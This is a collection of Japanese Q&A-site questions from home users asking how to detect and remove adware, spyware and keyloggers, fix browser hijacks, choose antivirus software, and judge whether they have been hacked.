PCに詳しい知人に嫌がらせをされており、ハッキング（クラッキング？）をしているようなことを言われました。 実際にネットサーフィンで閲覧したものや、プライベートな内容も知られているので間違いないです。 （他に共通の知人もおらず、SNSなどではないです） 履歴やパスワードだけでなく、例の遠隔操作の事件のようにPC画面全体の操作を見られているとしたら どう防げば良いのでしょうか？ セキュリティソフトでウイルスチェックをしても検出されず、ネットワーク経由で入られてる？場合など、 どこかで確認はできるのでしょうか？ 嫌がらせについては警察に被害届を出すことは考えていますが、ハッキングされているかまで調べてくれるのでしょうか？ 詳しい方どうぞよろしくお願いします。
doubleclick.netというのが出て困っています。 ネットで検索してスパイウエアらしいということがわかりました。 Spybot というソフトが有効だということを知り 早速インストールして、スキャンしてみました。 ウイルスソフトはをマカフィーを使用しています。 スキャンしても何も出てきません。 OSはwindows7です。 IE9とGoogle Chrome両方でネット検索中に doubleclick.netが立ち上がります。 削除するにはどうしたらいいですか？ このまま削除せずネットに接続するのは危険でしょうか？ 詳しい方教えてください。よろしくお願いします。
削除方法を調べて自分なりに削除したのですが、スタートページから検索を行うとGoogleではなくFunmoodsで検索されてしまいます。 about:configで項目をリセットしても反映されません。 特に「設定を完了する」様な項目が見当たらないので、リセットしたらそのままFirefoxを再起動したのですがそれで合ってますか？
iphoneを使用していますが、昨日から急にYahooホームページにONE PIECEのキャラが出現し、そのキャラの後ろに『TOUCH』と書いたボタンがあります。 ×ボタンもなく、何のコメントもありません… 触らないでいますが、 何なのか？ 消す方法を教えてください‼
現在、windows7を使っており、セキュリティ対策として、「spybot S&D」、「avira free antivirus」、「comodo firewall」を使用しております。spybot S&Dのアップデートを検索後、免疫保護を適用すると、spybot S&Dの「immunization incomplete」という表示とavira free antivirusの「hostsファイルがブロックされました」という表示が出て、免疫の非保護が18個残った状態になってしまいます。非保護が残ったままだと何となく気持ち悪いのですが、これを保護にするためにはどのようにすればよいのでしょうか？
E-mailは盗み見の可能性があると言われていますが、インターネットの閲覧行為や投稿行為も盗み見が出来る（技術的にありえる）のでしょうか？ つまり、電流にのせる情報が、不特定多数のpc（で自分宛でないものも受け入れるようにしたPC）にも入っていく可能性です。 よろしくおねがいします。
セキュリティ 「要求したページは暗号化されていますが、暗号化されていない項目を含んでいます。あなたがこのページで表示や入力する情報は第三者が簡単に傍受できます。」 と以前なかったメッセージがサイトによって出ます。 どういうことが読み取られ、どう対処設定しておけばいいのでしょうか？ m(__)m XP SP3以降Ver,最新更新　　Firefoxですm(__)m
PC8台ほどしかない小規模の企業です 一応ですがあるPCは全てネット環境にあります 私的利用やスパイウェア、ウィルスなどが社内問題です この三点を克服するに当たってどの様なシステムや商品が出回っているのでしょうか？ よくウィルスソフトを入れてても入ってこない様にしないと意味が無いとか ウィルスが入ってこない様にしててもPCの中にずっと居るので片方では意味が無いと言われます 何か名案があれば教えて下さい
以前、ある方(特定できてます)に、何らかの方法(監視ソフトかキーロガー？)で個人情報がつつぬけてました。 再インストールで盗まれる状況は解決したのですが、どうやらパソコンが攻撃されてます。 キーロガーやらスパイウエアやら…。 私が変なサイトを見たりＵＲＬをクリックしたわけではないです。 今のところはウイルスバスターがブロックしてくれてるようですが、不安です。 IPが分かれば攻撃できるものなのでしょうか？ ＩPを変えるかプロバイダを変えるかするしかないのでしょうか…。 また、ワイヤレスネットワークがセキュリティで保護されていないと表示されているんですが、近くの人でなくてもハッキングするのに関係ありますか？
なぜ常時安全性セキュリティ２４がWindows８に対応がおくれている
メールリンクをクリックしたり、ファイル保存などした事をきっかけに、パソコンにキーロガーや監視ソフトを入れられた場合、パソコンのどこにいるのでしょうか？ ウイルスやスパイウェアだった場合と、単なるソフトだった場合では違うのかと思いますが、何かご存知のことがあれば、よろしくお願いします。 また、他人にキーロガーを入れられた場合、ＬＡＮを切って作業をして、その後ＬＡＮを接続したら、ＬＡＮを切っていた時にうった文字も相手に読まれてしまうのでしょうか？
マイクロソフトセキュリティエッセンシャルの.exeファイルのエクスプローラー上での在り処がわかりません。 デスクトップショートカットアイコンを作りたいのと、ランチャーに組み込みたいので、質問させていただきました。 宜しく御願いします。
何かのサイトを開いたときにmshta.exeが変更されてしまい、上記のメッセージがでます。 サイトをいろいろと検索し、regeditで、該当のレジストリを削除するのですが、消しても消しても復活します。 何かいい方法をご存知ないでしょうか。 使用しているＯＳはWindows7です・・・。
質問の回答でもわからなかったので詳しく教えてください。（元の質問：http://oshiete.goo.ne.jp/qa/7788484.html） 質問１ 「インターネットエクスプローラーを使っています。（ウィンドウズ７） Googleをいつも使うのですが、最近見知らぬ変な広告が出るようになりました。 画像を添付します。 見ていてあまり気持ちのよいものではないので、消したいです。 ★★★それに、よく見ると広告の右下に薄く小さい文字で「ads not by this site」と書いてあります。　ウイルスでしょうか？ 誰かがウイルスを使ってGoogleの上に加えているんですか？ とっても心配です。 なぜなのか？どうやって消す（ブロックする）のか？教えていただけますか。よろしくお願いします。」 回答 「これはアドウェアという広告を表示する、スパイウェアに感染していると確実に言えます。 スパイウェア駆除ソフトウェアをインストールし、削除しましょう。 Spybot Search and Destroy というスパイウェアを除去出来る強力な無料ソフトがあるので それをインストールして、広告を出すアドウェアを削除してしまいましょう。 URLから、ダウンロードできます。 参考URL：http://filehippo.com/jp/download_spybot_search_d …」 質問2 「丁寧で具体的な回答ありがとうございます。 早速駆除ソフトをインストールしてチェックしたところ、よくわからないのですがたくさんのウイルスにかかっていたようです。↓ 「IncrediBar」（HijackersC）１０１個 「SweetIM」（PUPSC）2個 「Registry Helper]（Malware）1個 「W3i.lq5.fraud」（Adware）1個 「Yontoo.Pagerrage」（Adware）３個 恐ろしくなったので削除しようとしました。けれどもできなかったので調べてみたら、すでにウイルスが働いていると制限があって消せないとのことでした。 詳しく調べて、safeモードでたちあげて削除できました。 でもまだ広告が消えません。ということはまだ自分の情報が盗まれているのでしょうか？情報が漏れるのだけはとめたいです。 ウイルスソフトは「ウイルスはない」といってます。 どうすればよいのでしょうか？ほかの方法、可能性はありますか？ すいません質問になってしまいましたが、もう一度教えていただけますか？ よろしくお願いします。」 大変長くなってしまい本当に申し訳ありません。いろいろしてみたのですけれども、まだ変な広告（ウイルス）が消えません。 詳しい方、教えていただけますか？ よろしくお願いします。
google chromeの新しいタブを開くと　http://mystart.incredibar.com/mb174?a=6R8KCmJu72 …　の画面になってしまいます。　これを削除する方法を教えてください。 プログラムの一覧を見ても、mystart.incredibar　と思われるプログラムがどれなのかわかりません。 よろしくお願いします。
？カスペルスキー2012 マルチプラットフォームセキュリティです。 ネット初心者ですが、おねがいします。
こちらのサイトに載ってるようなフリーソフトをダウンロードしたところ http://www.video2mp3.net/ http://www.yukawanet.com/archives/2656051.html sweetimというものがインストールされてしまったようです。 グーグルクロームを使っているのですが、 それを起動した際にグーグルのページとsweetimのページの2つが起動します。 一番上の「新しいタブ」のページを開くと以前はよく見るページの一覧が表示されていたのですが、 sweetimのページが表示されるようになりました。 文字をコピーする時の感じでラインを引き、左クリックを押すと 「グーグルで○○を検索」という表示があったのですが、今は「ＳweeｔＩＭsearchで○○を検索」と出てくるようになりました。 プロバイダのウィルスに感染した際の無料相談が使えたので問い合わせたところ システムの復元で治るだろうと言われ試したのですが、 改善したのは 「新しいタブ」がよく見るページの一覧に戻ったことと 新しくインストールされたプログラムのデスクトップ上のアイコンがいくつか減りましたが、 SweetPcFixとsearch the Webというsweetim関連のアイコンが消えません。 どうすれば元に戻るのでしょうか？ 特に今のところ操作に大きな支障はないのですが、このまま放っておくのはまずいでしょうか？ システムの復元で元の状態に戻らないことってあるのでしょうか？ 私はパソコンに詳しくなく難しい作業はできません。 最悪、手間がかかるくらいならリカバリーも考えています。（それも手間なのですが。） 1年以内にパソコンを買い換えようと思っているので、あと1年問題なく使えるならこのままでいいかなと思っています。 sweetimって危険なのでしょうか？ 詳しい方よろしくお願いします。
一昨日より次のような状態になり、困っております。 (1)youtubeの動画下部に「SKIP AD」というボタンが表示され、 再生が非常に重い。 (2)ネット画面の下部に添付画像のような検索バナー？がでるようになる。また、ペ 　ージが全部表示されても、ずっと何かにアクセスし続け、動作が非常に重くIEがフ 　リーズすることがある。 これまでに、spypotで発見されたソフトの削除、アドオンの停止、IE８の再インストール を行い、(1)の「SKIP AD」というボタンは出なくなったのですが、他の症状が改善してお りません。 どなたか、同じような症状を解決した方がいましたら、対策をご教授願います。　　
下記サイトでCCleanerの無料版をダウンロードしたのですが、ダウンロードが完了しソフトを起動しようとしたら「インテリジェントスキャンされたクッキーを保持しますか？」という表示が出て、説明文には「この機能はCCleanerが現在のログイン情報(Hotmail、Gmail、Yahoo Mail等のウェブサイト)について永続的な保持をできるようにするためのものです。」とありました。「はい(Y)(推奨)」か「いいえ(N)」のどちらかのボタンをクリックして選択しなければなりません。今回「はい」を選んでインストールしたのですが、セキュリティの観点では果たして「はい」を選んで良かったのでしょうか。このクッキーを保持することにより、ウイルスやスパイウェア等に感染しやすくなったり情報が漏洩したり、不正アクセスされやすくなる可能性はあるのでしょうか。パソコン初心者ですので具体的で分かりやすいご回答をお願いします。 ＜ダウンロード先は下記です＞ http://www.piriform.com/ccleaner/download ＜ダウンロードしたバージョンは下記です＞ Download from:Piriform.com
本カテゴリを愛読しています。皆様の回答をいつも意義深く読ませて頂いております。 そして、セキュリティの総合ソフトを使い、またＩＰＡのＪＶＮなどで各ソフトのアップデートを図ってＰＣの自己防衛にいそしんでいます。（WindowsXP利用者、カスペ利用４年以上） 自称エキスパートの回答も意義深く読ませていただいております。 回答にいつも登場する最重基本対策の大部分は理解でき一部実行していますが、次の ＞JRE(Java Runtime Environmen)をインストールしてたら即刻アンインストール は結論だけが述べられてお、俄かに信じがたいのです。しかも即刻・・・ ｊａｖａは長年愛用しています。ｊａｖａのメリットとデメリットを是非とも伺いたいのです。 不躾な質問で申し訳ありませんが、何方かお教え頂けたら幸いです。
SugarSyncを更新した時、『疑わしい動作を検出しました』という表示が出てきました。 『許可』をクリックすると、今度は『セキュリティ対策ツール』で 　『例外ルールの数が上限に達しているため、新しい例外ルールを追加できません。 　このルールを追加したい場合は、既存のルールのいずれかを削除してください。』 というメッセージが出ます。 どれをどうして良いのか、何を消して良いのかわかりません。 常に、『疑わしい動作を検出しました』の表示が現れ、『拒否』にしても消えません。 困っております。　どなたかよろしくお願いいたします。
PCでサイトにアクセスるると、そのサイトにはどのPCからアクセスが来たか必ず履歴が残るのでしょうか？そこから自分のPCの中を覗かれ、様々な重要なデータを盗まれる、というようなことが起こリ得るのでしょうか？逆に自分のHPにアクセスした人のPCへ逆アクセスも可能でしょうか？通常のウィルスバスター等ではこれは防げないのでしょうか？ この方面に詳しい方、防御方法のアドバイスをお願いします。
質問の通り、TMPについて教えてください。 私のPCに、以下の二つのTMPが存在します。 名前　MSI6997.TMP 場所　c:\windowd\installer\msi6997.tmp 名前　SETE62a.TMP 場所　c:\users\私の名前\appdate\local\temp\sete62a.tmp これらはウイルスでしょうか？ それとも、レジストリという物が、断片的に残っているのでしょうか。 ただ、困ったことに、上記の場所を調べても、そのTMPがありません。 安全なものなら、放置しようと思うのですが、心配です。 ご存知の方が、いらっしゃいましたら、教えてください。
ウイルス対策としては、セキュリティソフトを常に更新することが一番とよく聞きますが、 初心者（家庭的なネット、メール使用者ですが、ネットバンク、ネット証券利用者です）としては、 どのような、どの程度のソフト（ダウンロードするもの、店で購入するものなど）をどのように使用・更新すればよいのか、よく分かりません。 どうぞ、よろしくお教え願います。
お世話になります。 画面上に常時サブウインドウが表示されてしまうようなスパイウエアが入ってしまったようで、システム構成ユーティリティのスタートアップ項目にそれらしきものが合ったので、無効にしたら、とりあえず出なくなりました。 これを完全に削除しいたいのですが、どのようにすればいいでしょうか。対策ソフトなどアドバイスいただけると助かります。 ちなみに、Spybot、Autorunsは、使ってみたのですが、いずれもスパイウエアを見つけることが出来ませんでした。 よろしくお願いします。
ウイルスバスター２０１２がウイルスバスタークラウドにバージョンアップしました。 前バージョンからの機能でシステムチューナーと情報漏えい対策とペアレンタルコントロールの機能でトラブルが発生して困っています。 トラブルの発生状況 どちらの機能も、正常な状態で概要説明の後に設定画面があるのですが、その画面が表示されません。 新規にアカウントを作成してログインすると上記トラブルは改善され、概要も設定画面も表示され一見トラブルは改善したかに見えますが、２日ほどすると概要も設定画面も表示されなくなります。 メーカーのトレンドマイクロにサポートを依頼しましたが、新規アカウントで改善が見られるので、アカウントに問題があるので、マイクロソフトのサポートを依頼してくださいと打ち切られました。 旧バージョンでは問題なく機能していたと思います。現在も、設定はできませんがシステムチューナーと情報漏えい対策は機能している。（ログインＩＤの送信を停止したとか、ＭＳＧが表示されている。） 最初のアカウントは全角漢字２文字でした。アカウントが全角だと対応してないアプリケーションもあるという書込みもあり、半角英数字９文字に変えてみましたが、２日ぐらいは改善したかに見えましたが表示されなくなりダメでした。 同様のトラブルでお困りの方、同様のトラブルを解決された方、或いは、解決方法をご存知の方、教えていただけると助かります。 以下、使用ＰＣのスペックです。 自作機 ＯＳ：Ｗｉｎｄｏｗｓ7　Ｕｌｔｉｍａｔｅ　ＳＰ１　６４bit Ｍ／Ｂ：ＡＳＵＳ　Ｍ４Ａ７８Ｔ－Ｅ ＣＰＵ：PhenomIIｘ４ ９４５ ＡＭ３　３ＧＨｚ ＲＡＭ：４ＧＢ その他、スペックが必要ならお教えください。 以上、よろしくサポートお願いします。
表題のログを見ますと、 １、SYN Flood to Host(PPPee1-OUT)の発信元（From）は大抵がパソコンのローカルアドレス（192.168.11.**）になっていますが、中にルーターのIPAdressになっている場合があります。その場合の相手は私のネットのプロバイダになっています。発信元がルーター内のIPAdressになっているのはどういう意味なのでしょうか？ ２、SYN Flood to Host(PPPee1-OUT)のFromがパソコンのローカルアドレスである場合の相手先アドレスがKDDI-Americaが多く見受けられます。KDDI-Americaにアクセスした心当たりはないのですが、KDDI-Americaはプロバイダ業務も行っているのでしょうか？ ネットワーク関係は全く初心者なものでさっぱり分かりません。どなたか教えて下さい。
ブラウザを立ち上げインターネットをしようかとするとモアフォーユーと言う楽天のべつのブラウザーが立ち上がりじゃまをします このブラウザーを出なくする方法はありませんか？
WindowsXPを使っています。Documents and Settingsフォルダに「catcache.dat」というファイルができていました。ノートパッドで開いてみましたが、バイナリらしくて読めませんでした。 これは一体なんのファイルなんでしょうか？気味が悪いので削除したいのですが、支障ないのでしょうか？
フィッシング詐欺のスパイウエアに感染しました。費用請求広告が画面に頻繁に出ます。 3種類の無料ウィルス対策ソフトを試しましたが、削除できません。 どこかにこのソフトが保管されていると思い、捜しましたが見つかりません。 どなたか、このウィルスの削除法を、素人にもわかり易く説明をしていただけませんか。
パソコンを起動すると、今日から突然back up duty liteと表示された名称のパネルが画面中央に表れます。 そのパネルには、○○をスキャンしますかというボタンが幾つもあり、○○とは写真、音楽、動画とか 諸々です。 よくわからないので、何も触らずに×でをクリックして閉じました。 これは何の事でしょうか？ 自分のＰＣはビスタで、有線でWimaxを使用しています。
お世話になります。 画面上に常時サブウインドウが表示されてしまうようなスパイウエアが入ってしまい、一応、システム構成ユーティリティのスタートアップ項目にそれらしきものが合ったので、無効にしたら、とりあえず出なくなりました。 完全に削除しいたいので、Autorunsを使ってみましたが、該当するものがヒットしません。 システム構築ユーティリティのスタートアップ項目にはそれがあり、ためしにチェックを外すと、間違いなく動き出します。しかし、Autorunsでは、見つかりません・・・。 どう対応すればいいでしょうか？ アドバイスいただけると助かります。 よろしくお願いします。
とあるブログのブログ主と言争いになりました。 そしてブログ主から 「あんたのＩＰアドレス　ブラウザ情報は知っている。アクセス履歴も書き込みもこちらには わかる」と言われました。 ブログ内での履歴や書き込みはわかるのでしょうが、 ハッキング等されてブログ外の履歴や書き込みもわかるのだろうかと心配になりました。 ファイアウォール機能のついたウイルスソフトでスキャンをしてみましたが、異常は ありませんでした。 ＩＰアドレスやブラウザ情報がわかっていれば、他人の閲覧履歴や書き込み内容は わかってしまうのでしょうか。 ハッキングの仕組みはよくわかりませんが、ひょっとしたら閲覧履歴がわかってしまうソフトなどを 入れられている可能性もあるでしょうか。パソコンを替えた方がよいですか。
たまたま他の質問者書き込みを読んで疑問に思いましたので、ココで質問させて頂きます。 まずココ↓の質問者と回答者No.5の内容を読んで下さい http://oshiete.goo.ne.jp/qa/7717359.html そして回答者No.5の「まぁ最近はサイトを覗いて手順を踏むと、自動でメールを送ってしまうプログラムがあったりするのが厄介ですが」の文章で疑問に思ったのですが あるサイトにアクセスするとＩＰアドレス又はリモートホストが相手に判ってしまう事は知っていますが メアドまでばれてしまう仕組みなんて存在するのでしょうか？ 例えばメアドの記入欄があり其処にメアドを記入して決定ボタンをクリックすれば、相手にばれてしまいますよね。（←当たり前の話しですが） しかしそのサイトにアクセスするだけでメアドがばれてしまうソフトが存在するのでしょうか？ どうも回答者No.5を読んでるとそのような解釈にも取れるのですが 「まぁ最近はサイトを覗いて手順を踏むと、自動でメールを送ってしまうプログラムがあったりするのが厄介ですが」の文章の解説をお願いします。
スパイスセキュリティを買って入れればwindows updateの更新プログラムが画面に出ることってないのでしょうか？ 無料のマイクロソフトセキュリティを入れたのですが・・ いちいちwindows updateが立ち上がって更新しないといけないのです 私はパソコンに疎いので電機店で購入してスパイウェア対策（ウィルスバスターなど）したら windows updateの更新が画面に出なくて勝手にしてくれるのでしょうか？
フリーソフトの名前で検索すると最近よく上位表示されるサイトです。 以前は大抵ベクターなどが上位表示されていました。 今回、ある古い本で知ったグーグルデスクトップを検索してみました。 すると、このようにsoftonicのサイトが一番に出てきました。 http://google-desktop.softonic.jp/ それから、暫く調べているとグーグルデスクトップは既にサービスを終了しているそうで なぜここはまだ公開されてダウンロードできるのだろうと不思議に思いました。 最初に不振に思ったのはＣｃｌｅｎｅｒと言うフリーソフトをダウンロードしてインストールする際に 他のソフトもバンドルされるような感じになり、以前本家からのＣｃｌｅｎｅｒダウンロードからは その様なことは無かったので、インストールを辞めました。 その時に怪しいサイトだなと記憶していたのですが 最近気がつくとこのサイトが検索上位によく出てきます。 このようなことがあるのかどうか解りませんが 既に、ブラウザ等がなんらかのウイルス等に乗っ取られてgoogleの検索結果を書き換えて 誘導されている可能性はないだろうか? とまで考えるようになりました。 そのようなことはありえますでしょうか? また、softonicと言うサイトの信頼性や安全性について 何かご存知方がいらしたらご意見いただけないでしょうか？ 追記 色々と事情があり セキュリティーソフトがインストール出来ないため確かめることができません。
McAfeeのトータルプロテクションを購入しました。 スキャンをすると「McAfee ウイルス対策ソフトウェアであなたのパソコンを完全に保護してください。」 というメッセージがでて、それをクリックすると「インターネットセキュリティ」「アンチウイルス　プラス」の購入が薦められています。 各ソフトの詳細を見ると「インターネットセキュリティ」「アンチウイルス　プラス」の機能を合わせたものがトータルプロテクションに思えるのですが何が違うのでしょうか？ また、これら３つのソフト全てを購入すると１４２３９円かかってしまいます。 値段的に高いような気がするのですが、Mcafeeの信頼性はウイルスバスターやノートンと比べてどうなのでしょうか？ 　　
ＰＣ立ち上げて数分後に、突然重くなりまして タスクマネージャーで見たら、MpSigStub.exeというプロセスが ＣＰＵとメモリをえらい使っていました。 これは悪意のあるスパイウェアかなんかでしょうか？ 素人ながら調べてみたら、Cドライブ直下のsystem32フォルダの中に あるとマルウェアだという記載もありました。 みたらありました。でもMicrosoftの署名があります。 良いのか悪いのかよく分かりません。 とにかく少しの間ですがPCがうなりをあげます。 何か良い対応策を教えて下さい。よろしくお願いします。
twitterに　私が入れない文が入ってました。直ぐ削除しましたが不気味です。第三者が無断で入れることが技術的に可能ですか。
私はあまりＰＣには詳しくないですが、どうぞ教えてください。 先月実家に帰省し、帰ってきてからＰＣを立ち上げたところ モニタリングツール：ｗｉｎ32/ＫＧＢ　Ｋｅｙｌｏｇｇｅｒというのが検出されました。 私のＰＣはＷｉｎ　ｘｐ、セキュリティソフトはMicrosoft Security Essentialsです。 何度もセキュリティソフト経由で削除していますが、削除できないのか何度でも検出される始末です。 手動で削除しようとしているのですが、セキュリティソフトが教えてくれるフォルダ名では見つけることが出来ませんでした。 私の使用しているセキュリティソフトでは、やはり駆除は出来ませんか？ 自分でもネットで色々見たのですが、外国語のものが多くてよく分からず（翻訳なども使いましたが） 今のところ手詰まりです。 とりあえず、ノーロガーを入れてみたりしていますが、これも意味ありますか？；； 詳しい方にこのキーロガーの駆除方法を教えていただきたいです。 あと今後の対策として、良いセキュリティソフトなども教えていただけたらと思います。 よろしくお願い致します。
会社のＰＣで、今日突然、「autontnt.dll」が不正プログラムとして認知され、警告がでました。 ウィルス対策ソフトは「ウィルスバスター」です。 ファイルが存在する箇所が 「system32」配下だったので、ファイルを確認し、 名前を変えたところ、警告は消えました。 この「autontnt.dll」は何者なのでしょうか。ファイルの日時は今年の７月です。
「APOPCH.EXE」なる物が以下の場所にありましたが、何なんでしょう？ 　C:\dell\drivers\R245244\Vista64 　C:\dell\drivers\R245244\Vista OSはWindous 7 Home Premium SP1です。 詳しい方よろしくお願いします。
Mircosoft Security Essentialsでフルスキャンしたとき、スキャン項目中に\Desktop\Agupeという文字列が見え隠れしますが、これは何の意味でしょうか。また、これはフランス語、スペイン語それとも何語でしょうかお教えください。以上。
Cドライブ直下にsniffer.logというファイルがいつのまにかできていました。 調べると何かパケットを記録してしまうものの様なのですが、削除しようとしても、使用中とのことで削除できず、セーフモードにして削除しようとしてもできないようです。 あまり、よくないもののようなので消したいのですが、どなたか解決方法を教えてくださいm(__)m よろしくお願いします。
ＰＣを起動すると画面の右下にしつこく『アダルトＴＵＢＥ』の『登録ありがとうございました。』と 画面がでてきます。 何度消しても出てきます。むしろだんだんと激しくでてきて消すことができず困っています。 私なりにインターネット上で調べて　ＭＳＣONFIGやＧＩＦＶ７など私のパソコンで調べたのですが、 あやしいプログラムなど発見できませんでした。 どなたかエロ広告を消す方法を教えて頂けないでしょうか？ ちなみに私のＰＣはＶＩＳＴＡです。 どうぞよろしくお願いいたします。
一月ぐらい前に、HDDを、落札購入したのですが、 表記の容量が認識されない代物でした。 ただ単に、容量が少ないのなら・・・我慢できるのですが、 外付けUSBで、つないだPCが、どうも具合が悪くなりました。２台共です。 ブルーバックとか、言われているようですが、 時々、再起動してしまいます。 その度に、さらに調子が悪くなっているようです。 データーを、少しづつ退避しているのですが、・・・・ 20G分少ない、ここにウイルスが、仕込まれていたのでしょうか？ さらに、ツイッターにlog-inできないと思っていたら、 誰かに、使われているようです。 新しい、ID？を作って・・・ 古いIDに送ることができました。 他に、どんな情報が流失したのか心配です。 2台のPCは、再インストールするとしても・・・ 今後の対応は、どうしたらいいのでしょうか？ 自分の情報はいいとしても・・・ 友人知人の情報も少しは入っていますので！ よろしくお願いします。 また、HDD等を、購入したときのチェック方法等も ご伝授いただければ幸いです。
　 　acer　aspire5741　Windows7　Homepremiam　を使用しています。 　buffaloの、家族で使っている無線LANに接続をしていました。 　新しく、Emobileの無線LAN（wifi？　・・用語の区別がつかないのですが、インターネットに接続するものです）　を使用し始めました。 　Embileの機種名は、pocketwifi lite　Gl04p　というものです。 　全部で4台のパソコンを持っており、他の3台には問題なく接続できたのですが、 　このパソコンAcerだけには、なぜかつながりません。 　これはどのようにしたらよいか、アドバイスをお願いいたします。　
エッチな動画を見てました。 しばらくすると「キャンペーン情報のご案内」というビキニ姿の女性がばーんと映った表示が何度消しても、再起動しても出るようになりました。キャンペーン期間48時間、とか書いてあるので、その期間を過ぎると消えるかも知れませんが、何とかして削除したいです。 ESET Smart Securityというソフトを入れていて対応してくれるだろう、と過信していましたが、甘かったです。 対応策ないでしょうか？
facebookに忍者解析ツールの様なアクセス解析ツール連携させると、閲覧者のIPアドレスがわかる？？ ブログに忍者解析ツールを入れると、訪問者のIPアドレスがわかります。 では、facebookと忍者解析ツールを連携すると、訪問者（友達申請許可してない人）のIPアドレスがわかりますか？？ 特に、友達じゃない人（友達申請許可していない人）の訪問が気になります。
困っています。 昨日夜突然デスクトップに不正要求のページが消しても消しても現れる、どなたか対策方法を教えてください。
これで3回目です。 (2０時～22時の2時間の間に) ESETウイルス駆除ソフトが防いでもらっていますが、 誰かがアクセスしていると思うと気味悪くてたまりません。 みなさんはどうやって解決していますか？ IPアドレスで逆探知を行った結果、相手はフランスからでした。 windowsログインパスワードは変更しましたがダメでした。 どなたかご知恵をお借りください。 よろしくお願いいたします。 自作PC win7
こんにちは。 数日前ですがパソコンが異常にのろくなりました。osはxpです。 起動時にのろくなったり、原因不明で少しだけ固まることはありますが、比較的ちゃんと動くパソコンです。 でもそのときは10分程度かな、とにかく固まってブラウザが次ぎのページに中々進まない感じになり、変に思い再起動をかけました。システムの復元も行いました。 するとしばらくすると動くのですがまた動かなくなりました。終了時にc8とかいう不明なプログラムが動いているのが分かり、よくわからんがokボタンを押して終了させました。 昨日なんですが「●さんですか？」と私の名前を尋ねる電話があり「はい」と答えるとすぐに切れました。詮索電話と言うのは珍しいです。 みに覚えなんですが先日あるニュースが気になり勤務先にメールでクレームしました。それを受けてうらんだものが何かやらかしたのかなと推測しますが、わかりません。メールにipアドレスや発信元情報が記載されているはずなのでそれを頼りにスパイウェアを送ってきたとも考えられますが、 ・質問　ありうる話でしょうか？ 不気味なのでウイルスソフトを最新のものにしたら固まる症状はでなくなりました。 ・質問　やはりスパイウェアかウイルスソフトの可能性が高いのでしょうか。 ・質問　だとすると相手はどのくらいの情報を盗んでいったか推測できますか？ よろしくお願いします。
アプリをインストールする時に警告メッセージが出ますが、その項目に「カメラでの写真と動画の撮影をアプリケーションに許可します。いつでも取得できます」とあったりします。 アンドロイドではアプリは起動したら起動しっぱなしですよね。バックグラウンドで動いている訳です。 これでユーザーに内緒に盗聴・盗撮できちゃいますよね。 リスキーすぎませんか？ 他のタブレット端末やOSでも同じですか？
ＯＳはWindows7のＳＰ1です。 Google Chromeを主に使っていて、使用後はパスワードを残して他の閲覧履歴(Ｃｏｏｋｉｅ含む)を削除しています。 なのに、SUPER Anti Spywareで検索するとcookieが毎回のように引っかかります。 このＣｏｏｋｉｅの出所がわかる方法はないでしょうか？ また、削除しているのに、一部のＣｏｏｋｉｅがなぜ残るのでしょうか？ SUPER Anti Spywareで削除するとそのつど再起動するので、できれば検索かける前に消したいです。 このＣｏｏｋｉｅを手動で削除する方法がありましたら教えてください。
は無料ですか？ 無料サイトで、誰でもアクセスできる予定です。 内容としては、google map にアクセスするだけの使用です。リンクですね。
スパイウェア対策のフリーソフト、「スパイウェアブラスター」はサイト閉鎖したのでしょうか？ アップデートができません。 わかる方お願いします。
PC画面の右下にWWII　RAGEというゲームの広告ポップアップが表示されていて困っています。 調べてみてスパイウェアだということが分かったのですがSpyBot、Aviraなどでスキャンしても 出てきません。 システム構築ユーティリティなどの使い方も調べたのですがどのプロセスがそれなのか わからない状態です。 駆除する方法を教えてください、よろしくお願い致します。
下記メールが頻繁に届き困っています。 配信停止の鉄好きをしたら益々頻繁に遅れれるようになり、非常に困っています。 メールアドレスを反抗する以外に、受信を拒否する方法を教えて下さい。 送られてくるメール [永久無料HAPPYDAYS] 現金3万円当選詳細↓ ================ 【永久ALL無料】 ☆ギャルナースあや様よりメッセージ [無料メッセージ] ヒマしてる人？時間があるなら待ち合わせしてちょんヾ(´▽｀*)ゝ ▼無料閲覧＆無料返信 http://pc.DQn***.vq5oly493v0dq4m.info/~Mdadnx409 … 【安心ALL無料】 ------------------ [会員番号:1158038] ▼メインメニュー http://pc.DQn***.vq5oly493v0dq4m.info/~Mdadnx409 … ※HAPPYDAYSは健全なSNSサイトです。同じ趣味の人をたくさん見つけましょう☆ ------------------ ALL無料HAPPYDAYS ◆メールALL無料 ◆連絡先交換ALL無料 ◆画像・動画ALL無料 ◆他コンテンツALL無料 ------------------ ※6サイト(ニュース・動画・SNS・着歌・懸賞・他サイト)吸収合併致しました。 ※当メールはご利用規約に基づき配信しております。 ※配信停止希望の方は http://pc.DQn***.vq5oly493v0dq4m.info/~Mdadnx409 … HAPPYDAYS 18歳未満利用禁止
Windows7です。 過去にインストールしたAd-aware960を削除したいのですが、一部がのこってしまいます。 本体はコントロールパネルの「プログラムと機能」からアンインストールしました。 しかし、Program Files\Lavasoft Ad-awareのフォルダが残ってしまいます。 中身は Languages、Ad-AwareCommand、 AutoLaunch、 CEAPI.dll、 kernesplorer64、 lsdelete、 Shellext64 、threatwork、　以上です。 もう一度インストールし直し、今度は付属のアンインストーラーから試しましたが、やはり残ってしまいます。 このフォルダを削除しようとすると、「エクスプローラーで使用しているため削除できません」と出ます。 一つずつ削除しましたが、Shellext64.dllが削除できませんでした。 悪さするわけではないようですが、気持ち悪いのでできれば完全に消したいです。 どうすればいいでしょうか？ ちなみに最新版をインストールしてみましたが、旧バージョンを削除せずに別にフォルダを作って共存してしまいました。
画面の右下にゲームの広告「WWII RAGE」という広告が出てきて色々調べてみて、 スパイウェアなどもチェックしたのですが、治らなかったのでシステム構成ユーティリティーを 外していく作業をしているのですが、添付写真の中で外していいもの、ダメなものが分かりません。 どなたかお教えいただけますか？
スパイウェアはnetに接続している時に活動すると思うのですが。 するとWindows Defenderやアンチ・ウィルスソフトでスキャンを行う際はnetに接続した状態で行うのが好ましいのでしょうか？ 接続していない状態でスキャンしても効果が少ないのでは？ 以上　宜しくお願いします。
